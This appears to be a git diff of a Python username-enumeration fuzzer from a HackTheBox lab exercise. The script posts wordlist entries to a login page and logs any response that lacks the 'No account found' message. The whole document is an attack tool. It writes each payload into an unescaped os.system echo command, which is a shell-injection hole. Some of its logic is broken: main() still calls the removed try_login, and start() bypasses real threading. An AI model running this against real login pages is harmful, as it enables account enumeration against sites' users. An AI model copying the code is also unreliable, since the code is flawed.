@@ -13,34 +13,64 @@ import threading
 import logging
 import sys
 import os
-
+import copy
+import uuid
+import time
 from concurrent.futures import ThreadPoolExecutor
 from concurrent.futures import as_completed
 
 
-URL_LOGIN = ''
+URL_LOGIN = 'http://docker.hackthebox.eu:31094/administrat/index.php'
 
 headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
-def err(msg): print(' ops... error is %s' % msg); exit(1)
+def err(msg): print('\n ops... error > %s' % msg); exit(1)
 
-def try_login(payload):
-    try:
-        datapost = "username=FUZZ&password=password".replace('FUZZ', payload)
-        rq = requests.post(url=URL_LOGIN, data=datapost, headers=headers, timeout=5)
+class CustomRequests(threading.Thread):
 
-        logging.warning(' - requests with payload "%s" and response "%s"' % (datapost, rq.status_code))
+    headers_class = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
+        'Accept-Encoding': 'gzip, deflate'
+    }
 
-        if not 'No account found with that username.' in rq.text:
-            print(' * find my frind! \\0.0/\n\tpayload: %s' % (payload))
-            os.system('echo "%s" >> ok.txt' % payload)
+    def __init__(self, method_req='POST', url='', pattern='', payload='', datapost=None, headers=None):
+        super(CustomRequests, self).__init__()
+        self.kill = threading.Event()
 
-        sys.stdout.write('\r try [%s:%s]\t' % (payload, rq.status_code))
-        return True
+        self.headers = headers if headers is not None else copy.deepcopy(self.headers_class)
+        self.url = url
+        self.datapost = datapost
+        self.method_req = method_req
+        self.pattern = pattern
+        # implementar uso de cookies
 
-    except Exception as e:
-        err('- to request > %s' % e)
-        return False
+    def start(self): self.run()
+
+    def run(self):
+        while not self.kill.is_set():
+            try:
+                sys.stdout.write('\r try > %s' % self.datapost)
+                response = requests.post(self.url, headers=self.headers, data=self.datapost, timeout=5)
+
+                if response.status_code == 200:
+                    logging.info(' [+] sucessful request with response code "%s" and datapost="%s"' % (response.status_code, self.datapost))
+                else:
+                    logging.info(' [!] request.status_code "%s"  with datapost "%s"' % (response.status_code, self.datapost))
+
+                if self.pattern in response.text:
+                    os.system('echo "%s" >> ok.txt' % self.datapost)
+                    print(' ✔️ aqui -> %s' % self.datapost)
+
+            except Exception as err:
+                logging.error(' [-] error to requesto at "%s" with datapost "%s"' % (self.url, self.datapost))
+                logging.error(' error %s' % err)
+            else:
+                break
+
+    def stop(self):
+        # eh ist, fim da linha thread...
+        self.kill.set()
+
 
 def load_wordlist(path):
     fp = open(path, mode='r', errors='ignore')
@@ -48,36 +78,62 @@ def load_wordlist(path):
     fp.close()
     return list(map(lambda x: x.replace('\n', ''), lines))
 
+
 def main(payloads):
     with ThreadPoolExecutor(max_workers=5) as executor:
         return executor.map(try_login, payloads, timeout=30)
 
 
+
 if __name__ == '__main__':
     logging.getLogger('requests').setLevel(logging.WARNING)
-    logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s\t %(message)s', filename='fuzz.log', filemode='a+')
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s', filename='tool0fuzz.log', filemode='a+')
+
+    pattern = 'No account found with that username.'
 
     try:
         if len(sys.argv) >= 2:
-            print(' hi, friend! fuzz script init :D')
+            print('☄️ hi, friend! fuzz.py - init 💤 ')
 
-            if not os.path.isfile(sys.argv[1]):
-                err('wordlist path not found :(')
+            if not os.path.isfile(sys.argv[1]): err('wordlist path not found 🐤')
             wordlist = load_wordlist(sys.argv[1])
+
+            threads = dict()
+            list_active_threads = []
 
             try:
                 for payload in wordlist:
-                    resp = try_login(payload)
-                    if resp is False:
-                        print(' [!] failed to request with payload "%s"' % payload)
-                        try_login(payload)
-                print(' eh isto, quem achou achou, quem não paciência...')
+
+                    while len(list_active_threads) >= 50:
+                        print('\n max lenght thrads [%s]' % len(threads))
+                        for uid_thread, thread in threads.items():
+                            if thread.is_alive() is False:
+                                if thread in list_active_threads:
+                                    list_active_threads.remove(thread)
+                                ## del threads[uid_thread]
+                        time.sleep(5)
+
+                    payload = payload if len(payload) != 0 else 'test'
+                    tmpdata = "username=FUZZ&password=password".replace('FUZZ', payload)
+                    tmp = CustomRequests(url=URL_LOGIN, pattern=pattern, datapost=tmpdata)
+ 
+                    threads[uuid.uuid4()] = tmp
+                    list_active_threads.append(tmp)
+                    tmp.start()
+
+                    for uid_thread, thread in threads.items():
+                        if thread.is_alive() is False:
+                            if thread in list_active_threads:
+                                list_active_threads.remove(thread)
+                            ## del threads[uid_thread]
+                print('\n 🦘 eh isto, quem achou achou, quem não paciência...')
 
             except Exception as e:
-                err(' - main function > %s ' % e)
+                print(' 🔊 error main function > %s' % e)
         else:
-            print(' usage: %s %s' % (sys.argv[0], 'path/to/wordlist'))
+            print(' usage: %s %s' % (sys.argv[0], 'wordlist'))
+
     except KeyboardInterrupt:
         sys.stdout.write('\n\r ok ok, vou terminar aqui...')
     except Exception as e:
-        err('- grant - %s' % e)
+        print(' ops...error -> %s' % e)
